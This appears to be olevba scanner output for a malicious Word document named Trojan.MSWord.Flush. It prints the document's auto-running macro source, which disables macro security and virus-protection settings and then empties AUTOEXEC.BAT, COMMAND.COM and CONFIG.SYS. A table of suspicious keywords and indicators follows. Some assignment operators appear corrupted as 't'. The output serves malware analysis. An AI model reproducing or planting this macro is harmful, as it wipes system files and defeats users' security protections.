olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Flush-0817061baf940ee22e7a3e16167c6d8005338e6a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Flush-0817061baf940ee22e7a3e16167c6d8005338e6a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()

On Error Resume Next

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\security", "Level") <> "" Then

    CommandBars("Macro").Controls("Security...").Enabled t
    False System.PrivateProfileString("","HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security","level") t 1&

Else

    CommandBars("Tools").Controls("MAcro").Enabled t False

    With Options

        .ConfirmConversions t False

        .SaveNormalPrompt t False

        .VirusProtection t False

    End With

End If



SetAttr "C:\Autoexec.BAT", vbNormal         'Let's Flush Autoexec.bat

    Open "C:\AUTOEXEC.BAT" For Output As #1

Close #1



SetAttr "C:\COMMAND.COM", vbNormal          ' Let's Flush Command.com

    Open "C:\COMMAND.COM" For Output As #1

Close #1

SetAttr "C:\CONFIG.SYS", vbNormal

    Open "C:\CONFIG.SYS" For Output As #1   'Let's Flush Config.sys

Close #1



End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Autoexec.BAT        |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

